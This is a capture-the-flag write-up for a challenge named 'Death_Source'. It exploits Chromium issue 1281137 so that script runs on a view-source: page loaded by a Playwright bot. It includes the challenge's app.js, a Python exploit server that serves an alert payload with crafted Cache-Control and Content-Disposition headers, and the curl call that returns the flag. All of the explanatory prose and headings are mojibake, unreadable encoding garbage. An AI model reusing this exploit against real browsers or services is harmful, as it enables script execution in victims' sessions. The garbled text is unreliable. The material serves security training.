# ð¥µ Death_Source

## åé¡æ
ãããä¸ã®ã½ã¼ã¹ã¯å¨é¨å®å¨ãªã¯ãã§ãã  
alertãªãã¦ã§ãã¾ãããã­ï¼  
ãã©ã°ã¯`flag{æå­å}`ã®å½¢å¼ã§ã`process.env.FLAG`ã«å¥ã£ã¦ãã¾ãã  
[http://localhost:3000?url=https://example.com](http://localhost:3000?url=https://example.com)  
[app.js](files/app.js)  

## é£æåº¦
**2å²è§£ãã**  

## ä½åã«ããã£ã¦
Chromiumã®èå¼±æ§ï¼ãä½¿ã£ãåé¡ã§ãã  
ç§ãè¦ã¤ããããã§ã¯ãªãã§ãããå¬éããã¦ããé¢ç½ãããªæåã ã£ãã®ã§åé¡ã«ãã¾ããã  
è©³ç´°ã¯ã[Issue 1281137: Omnibox removes view-source: and renders the page without displaying the HTML source](https://bugs.chromium.org/p/chromium/issues/detail?id=1281137)ãã§ãã  
ç°¡åã«è¨ãã¨`view-source:`ã¸ã®ã¢ã¯ã»ã¹ã§JavaScriptãåãããã¨ãã§ãã¾ãã  

## è§£æ³
URLã«ã¢ã¯ã»ã¹ããã¨ã`?url=`ã§æå®ããããã¼ã¸ã®"ã½ã¼ã¹ã®è¡¨ç¤ºã½ã¼ã¹"ãè¡¨ç¤ºãã¦ãããµã¤ãã®ããã ã  
éå¸ãããapp.jsã®ä¸­èº«ã¯ä»¥ä¸ã®ããã§ãã£ãã  
```JavaScript
~~~
async function http_get(url) {
    const browser = await playwright.chromium.launch({headless: true});
    const context = await browser.newContext();
    const page = await context.newPage();

    let flag = "This source code is yummy !!!<br>";

    page.on("dialog", async dialog => {
        /* <script>alert('Satoki');</script> */
        if (dialog.type() === "alert") {
            flag = process.env.FLAG; // Congrats!
            console.log("[flag]: " + url);
        }
        await dialog.accept();
    });

    /* Can you execute JavaScript on view-source: ? */
    try {
        // First bite
        await page.goto("view-source:" + url, {timeout: 2000});
        flag += "<pre><code>" + sanitize(beautify.html(await page.content())) + "</code></pre>";
    } catch (error) {console.log("[error]: " + error);}
    await page.waitForTimeout(100);

    try {
        // Second bite
        await page.reload();
    } catch (error) {console.log("[error]: " + error);}
    await page.waitForTimeout(100);

    await browser.close();

    return flag;
}
~~~
```
ã¦ã¼ã¶ããã®URLãplaywright.chromiumã®`view-source:`ã§éãã¦ãªã­ã¼ããã¦ããã  
ã³ã¡ã³ãã®éã`view-source:`ã§JavaScriptãå®è¡ãã¦ãalertãåºãã°ããããã ã  
ãã¤ãã¿ã¼ã§ãchromium view-source: lang:jaãã¨æ¤ç´¢ããã¨[çºè¦èã®ãã¤ã¼ã](https://twitter.com/reinforchu/status/1471995823684984835)ãåºã¦ããã  
ããã«èª¿ã¹ãã¨[å ±åãã¤ã¼ã](https://twitter.com/reinforchu/status/1472414835849990147)ãè¦ã¤ããã  
ã[Issue 1281137: Omnibox removes view-source: and renders the page without displaying the HTML source](https://bugs.chromium.org/p/chromium/issues/detail?id=1281137)ãã«è©³ç´°ãè¨ããã¦ãããã¨ã©ã¼ãã¼ã¸ã®ãªãã¤ã¬ã¯ãæã«`view-source:`ãæ¬ è½ãããã°ã®ããã ã  
PoCãåãã¼ã¸ããæã«å¥ãã®ã§csãã¡ã¤ã«ãå®è¡ããããèªåã§ãµã¼ããå®è£ããã°ããã  
pythonã§å®è£ããªããããµã¼ãã¹ã¯ãªããexploit.pyã¯ä»¥ä¸ã«ãªãã  
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

address = ("0.0.0.0", 4000)

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Cache-Control", "no-cache, no-store")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        if self.headers["Cache-Control"]:
            self.send_header("Content-Length", "32")
        else:
            self.send_header("Content-Disposition", "form-data; name=\"ieldName\"; filename=\"Chromium_Bug\",inline")
        self.end_headers()
        self.wfile.write(b"<script>alert('imctf');</script>")

with HTTPServer(address, MyHTTPRequestHandler) as server:
    server.serve_forever()
```
ãããã©ããã§å®è¡ãã¦ãåé¡ãµã¼ãã«ãã®ã¢ãã¬ã¹ãæããã°ããã  
```bash
$ curl 'http://localhost:3000/?url=http://localhost:4000'
flag{Did_you_lick_Death_Sauce_???}
```
flagãå¾ãããã  

## flag{Did_you_lick_Death_Sauce_???}